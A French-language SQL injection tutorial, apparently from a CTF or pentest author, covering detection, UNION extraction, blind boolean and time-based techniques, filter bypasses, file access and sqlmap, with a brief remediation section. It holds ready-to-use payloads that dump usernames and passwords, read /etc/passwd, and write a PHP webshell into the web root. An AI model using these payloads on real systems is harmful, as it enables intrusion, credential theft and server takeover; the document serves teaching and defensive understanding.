# Injection SQL

Une injection SQL survient quand une entrée utilisateur se retrouve dans une
requête SQL sans être séparée du *code* de la requête. Si tu arrives à sortir de
la *donnée* pour entrer dans la *requête*, tu peux lire, modifier ou vider la
base. Voici ma façon de procéder, de la détection à l'extraction, avec les
payloads que j'utilise vraiment.

Tous les exemples ci-dessous sont génériques (tables et paramètres inventés), ce
n'est la solution d'aucun challenge précis.

## 1. La détecter

La première chose que je teste sur un paramètre (URL, champ de formulaire,
en-tête, cookie) : casser la syntaxe de la requête et observer la réponse.

Le guillemet simple est la sonde classique :

```
id=1'
```

Trois cas possibles :

- une erreur SQL apparaît (`You have an error in your SQL syntax…`) -> très
  probablement injectable, et les messages d'erreur vont beaucoup aider.
- la page casse ou se comporte différemment (pas d'erreur, mais sortie
  différente).
- rien ne change -> peut-être pas injectable, peut-être juste en aveugle.

Ensuite je confirme avec deux payloads censés être logiquement équivalents si
l'entrée arrive bien dans la requête :

```
id=1 AND 1=1      -> page normale
id=1 AND 1=2      -> page différente / vide
```

Si `1=1` et `1=2` donnent des résultats différents, l'entrée est évaluée comme
du SQL.

## 2. Contexte : chaîne ou numérique

Le payload change selon la façon dont l'entrée est entourée dans la requête.

Contexte numérique (`... WHERE id = 1`) :

```
id=1 AND 1=1
id=1 OR 1=1
```

Contexte chaîne (`... WHERE name = '1'`) : il faut d'abord refermer le guillemet.

```
name=1' AND '1'='1
name=1' OR '1'='1
```

Astuce rapide : si `1'` provoque une erreur mais que `1' -- -` (fermeture +
commentaire) la corrige, tu es en contexte chaîne. Le `-- -` commente le reste
de la requête.

## 3. In-band : extraction via UNION

Quand la page affiche les résultats de la requête, `UNION SELECT` est le moyen
le plus rapide d'extraire des données. Deux choses à trouver d'abord.

**Nombre de colonnes** — `UNION` exige le même nombre de colonnes. J'utilise
`ORDER BY` en augmentant jusqu'à l'erreur :

```
id=1 ORDER BY 1 -- -
id=1 ORDER BY 2 -- -
id=1 ORDER BY 3 -- -   <- une erreur ici = il y a 2 colonnes
```

**Colonnes affichées** — lesquelles apparaissent réellement sur la page :

```
id=-1 UNION SELECT 1,2 -- -
```

(Le `-1` vide la ligne d'origine, pour que ce soit la ligne du UNION qui
s'affiche.) Les numéros qui apparaissent sont les colonnes où tu peux écrire.

Puis on récupère ce qu'on veut dans le schéma (exemple MySQL) :

```
id=-1 UNION SELECT table_name,2 FROM information_schema.tables WHERE table_schema=database() -- -
id=-1 UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' -- -
id=-1 UNION SELECT username,password FROM users -- -
```

Fonctions utiles : `database()`, `version()`, `current_user()`, et
`group_concat(col SEPARATOR ',')` pour empaqueter plusieurs lignes dans un seul
champ affiché.

## 4. Injection en aveugle (blind)

Pas de sortie et pas d'erreur ? On déduit la donnée bit par bit, à partir d'un
signal qu'on *peut* observer.

**Boolean-based** — la page diffère selon vrai/faux :

```
id=1 AND SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a' -- -
```

On parcourt chaque position et chaque caractère ; une page « vraie » signifie
que la supposition est bonne. En pratique je compare avec `>` pour faire une
recherche dichotomique sur chaque caractère plutôt que de brute-forcer a..z.

**Time-based** — rien de visible du tout, alors on fait *attendre* la base :

```
id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(3), 0) -- -
```

Si la réponse met ~3s, la condition était vraie. Lent, mais efficace quand il
n'y a aucun autre retour. (`SLEEP()` sur MySQL, `pg_sleep()` sur Postgres,
`WAITFOR DELAY` sur MSSQL.)

## 5. Contourner les filtres

Face à des filtres naïfs :

- **Commentaires / espaces** : `UNION/**/SELECT`, ou des retours à la ligne /
  tabulations à la place des espaces.
- **Casse & mots-clés** : `UnIoN SeLeCt` ; si `SELECT` est retiré une fois,
  `SELSELECTECT` survit à un remplacement non récursif.
- **Encodage** : URL-encoder (`%27` pour `'`) ou double-encoder (`%2527`) quand
  une couche décode une fois.
- **Guillemets bloqués** : construire des chaînes sans guillemets avec
  `CHAR(0x61)` ou des littéraux hexa comme `0x61646d696e` pour `admin`.
- **Astuces de charset** : dans une config type GBK, une séquence multioctet
  bien choisie peut recombiner un guillemet échappé en guillemet actif, et
  défaire un échappement type `addslashes`.

## 6. Lire et écrire des fichiers

Avec assez de privilèges (`FILE`), l'injection devient de l'accès fichier :

```
id=-1 UNION SELECT LOAD_FILE('/etc/passwd'),2 -- -
id=-1 UNION SELECT '<?php system($_GET[0]); ?>',2 INTO OUTFILE '/var/www/html/s.php' -- -
```

`LOAD_FILE` lit, `INTO OUTFILE`/`INTO DUMPFILE` écrit — le second peut déposer
un webshell si tu peux écrire dans la racine web. Les deux dépendent des
privilèges de la base et de `secure_file_priv`.

## 7. Automatiser

Une fois l'injection comprise à la main, `sqlmap` fait gagner du temps. On
enregistre la requête depuis Burp et on pointe le paramètre :

```
sqlmap -r request.txt -p id --batch
sqlmap -r request.txt -p id --dbs
sqlmap -r request.txt -p id -D app -T users --dump
```

Je la cartographie quand même à la main d'abord — on apprend plus, et on sait
exactement ce que fait sqlmap.

## 8. Corriger

Pour être complet, parce que connaître le correctif fait partie de connaître la
faille :

- **Requêtes paramétrées / préparées** — le vrai correctif. La donnée est
  envoyée séparément de la requête, donc elle ne peut jamais être interprétée
  comme du code.
- **Moindre privilège** sur le compte de la base (pas de `FILE`, pas de DDL
  inutile).
- La validation d'entrée et les WAF aident, mais ne remplacent pas les requêtes
  préparées.

---

Fait par **White** · [github.com/white-exee](https://github.com/white-exee)
